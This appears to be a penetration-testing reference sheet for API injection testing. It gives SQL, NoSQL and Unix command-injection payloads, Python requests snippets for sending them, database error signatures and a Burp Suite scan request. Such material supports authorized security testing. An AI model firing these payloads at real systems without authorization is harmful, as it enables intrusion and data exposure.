# API Reference: API Injection Vulnerability Testing

## OWASP API Security Top 10

| # | Risk | Description |
|---|------|-------------|
| API1 | Broken Object Level Auth | Accessing other users' data |
| API2 | Broken Authentication | Weak auth mechanisms |
| API3 | Broken Object Property Level Auth | Mass assignment |
| API8 | Security Misconfiguration | Injection via misconfig |
| API10 | Unsafe Consumption | Server-side injection |

## SQL Injection Payloads

### Error-Based
```
' OR '1'='1
' UNION SELECT NULL,NULL--
' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--
```

### Time-Based Blind
```
' AND SLEEP(5)--
' AND pg_sleep(5)--
'; WAITFOR DELAY '0:0:5'--
```

## NoSQL Injection Payloads

### MongoDB Operator Injection
```json
{"username": {"$ne": ""}, "password": {"$ne": ""}}
{"username": {"$gt": ""}}
{"username": {"$regex": "admin.*"}}
```

### Where Clause Injection
```json
{"$where": "this.password == 'test'"}
```

## Command Injection Payloads

### Unix
```
; id
| whoami
$(id)
`id`
```

### Blind Command Injection
```
; sleep 5
| ping -c 5 127.0.0.1
$(sleep 5)
```

## Python requests Library

### GET with Parameters
```python
import requests
resp = requests.get(url, params={"id": payload}, timeout=10, verify=False)
```

### POST with JSON Body
```python
resp = requests.post(url, json={"field": payload}, timeout=10)
```

### Response Analysis
| Attribute | Usage |
|-----------|-------|
| `resp.status_code` | HTTP status |
| `resp.text` | Response body |
| `resp.elapsed.total_seconds()` | Response time |
| `len(resp.content)` | Response size |

## Error Signatures

### SQL Databases
| Database | Error Pattern |
|----------|---------------|
| MySQL | `You have an error in your SQL syntax` |
| PostgreSQL | `ERROR: syntax error at or near` |
| MSSQL | `Unclosed quotation mark` |
| Oracle | `ORA-01756` |
| SQLite | `SQLITE_ERROR` |

## Burp Suite API

### Initiate Scan
```http
POST https://burp:1337/v0.1/scan
Content-Type: application/json

{
  "urls": ["https://api.target.com/v1/users"],
  "scan_configurations": [{"name": "Audit checks - SQL injection"}]
}
```
